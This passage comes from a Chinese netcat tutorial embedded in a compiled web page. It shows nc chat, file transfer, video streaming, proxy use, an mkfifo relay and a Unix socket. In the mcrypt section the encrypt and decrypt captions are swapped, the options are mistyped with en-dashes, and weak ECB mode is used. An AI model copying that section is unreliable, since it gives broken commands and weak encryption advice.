<span class="line"><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">root@server2 </span><span style="color:#89DDFF;">~]</span><span style="color:#A6ACCD;"># nc -l 1234 </span></span>
<span class="line"><span style="color:#FFCB6B;">hello!</span></span>
<span class="line"><span style="color:#FFCB6B;">hi!</span></span>
<span class="line"></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># B:</span></span>
<span class="line"><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">root@server1 </span><span style="color:#89DDFF;">~]</span><span style="color:#A6ACCD;"># nc  A_IP 1234 </span></span>
<span class="line"><span style="color:#FFCB6B;">hello!</span></span>
<span class="line"><span style="color:#FFCB6B;">hi!</span></span></code></pre></div><h3 id="nc加密通过网络发送的数据" tabindex="-1">nc加密通过网络发送的数据 <a class="header-anchor" href="#nc加密通过网络发送的数据" aria-label="Permalink to &quot;nc加密通过网络发送的数据&quot;">​</a></h3><p>如果你担心你在网络上发送数据的安全，你可以在发送你的数据之前用如mcrypt的工具加密。</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">服务端</span></span>
<span class="line"><span style="color:#A6ACCD;">$nc localhost 1567 </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">mcrypt</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">–flush</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">–bare</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-F</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-q</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-d</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-m</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">ecb</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">file.txt</span></span>
<span class="line"><span style="color:#FFCB6B;">使用mcrypt工具加密数据。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FFCB6B;">客户端</span></span>
<span class="line"><span style="color:#A6ACCD;">$mcrypt –flush –bare -F -q -m ecb </span><span style="color:#89DDFF;">&lt;</span><span style="color:#A6ACCD;"> file.txt </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">1567</span></span></code></pre></div><p>使用mcrypt工具解密数据。 以上两个命令会提示需要密码，确保两端使用相同的密码。</p><p>这里我们是使用mcrypt用来加密，使用其它任意加密工具都可以。</p><h3 id="nc流视频" tabindex="-1">nc流视频 <a class="header-anchor" href="#nc流视频" aria-label="Permalink to &quot;nc流视频&quot;">​</a></h3><p>虽然不是生成流视频的最好方法，但如果服务器上没有特定的工具，使用netcat，我们仍然有希望做成这件事。</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">服务端</span></span>
<span class="line"><span style="color:#A6ACCD;">$cat video.avi </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">1567</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#FFCB6B;">客户端</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">这里我们只是从一个视频文件中读入并重定向输出到netcat客户端</span></span>
<span class="line"><span style="color:#A6ACCD;">$nc 172.31.100.7 1567 </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">mplayer</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-vo</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">x11</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-cache</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">3000</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-</span></span></code></pre></div><p>这里我们从socket中读入数据并重定向到mplayer。</p><h3 id="nc通过proxy连接" tabindex="-1">nc通过Proxy连接 <a class="header-anchor" href="#nc通过proxy连接" aria-label="Permalink to &quot;nc通过Proxy连接&quot;">​</a></h3><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">這指令會使用</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">10.2</span><span style="color:#C3E88D;">.3.4:8080</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">這個代理伺服器，</span></span>
<span class="line"><span style="color:#FFCB6B;">連線至</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">host.example.com</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">的</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">42</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">連接埠。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-x10.2.3.4:8080</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-Xconnect</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">host.example.com</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">42</span></span></code></pre></div><h3 id="nc用作代理proxy" tabindex="-1">nc用作代理proxy <a class="header-anchor" href="#nc用作代理proxy" aria-label="Permalink to &quot;nc用作代理proxy&quot;">​</a></h3><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">也可以用来做代理。比如下面这个例子，</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FFCB6B;">$</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">ncat</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">8080</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">ncat</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">192.168</span><span style="color:#C3E88D;">.1.200</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">80</span></span>
<span class="line"><span style="color:#FFCB6B;">所有发往我们服务器</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">8080</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">端口的连接都会自动转发到</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">192.168</span><span style="color:#C3E88D;">.1.200</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">上的</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">80</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">端口。</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">不过由于我们使用了管道，数据只能被单向传输。</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">要同时能够接受返回的数据，我们需要创建一个双向管道。</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">使用下面命令可以做到这点:</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FFCB6B;">$</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">mkfifo</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">2</span><span style="color:#C3E88D;">way</span></span>
<span class="line"><span style="color:#FFCB6B;">$</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">ncat</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">8080</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">0</span><span style="color:#89DDFF;">&lt;</span><span style="color:#C3E88D;">2way</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">ncat</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">192.168</span><span style="color:#C3E88D;">.1.200</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">80</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">1&gt;</span><span style="color:#C3E88D;">2way</span></span>
<span class="line"><span style="color:#FFCB6B;">现在你可以通过</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">代理来收发数据了。</span></span></code></pre></div><h3 id="nc建立unix-domain-socket" tabindex="-1">nc建立Unix Domain Socket <a class="header-anchor" href="#nc建立unix-domain-socket" aria-label="Permalink to &quot;nc建立Unix Domain Socket&quot;">​</a></h3><p>這行指令會建立一個 Unix Domain Socket，並接收資料</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-lU</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">/var/tmp/dsocket</span></span></code></pre></div>`,84),e=[o];function t(c,r,C,y,D,A){return a(),n("div",null,e)}const h=s(p,[["render",t]]);export{F as __pageData,h as default};
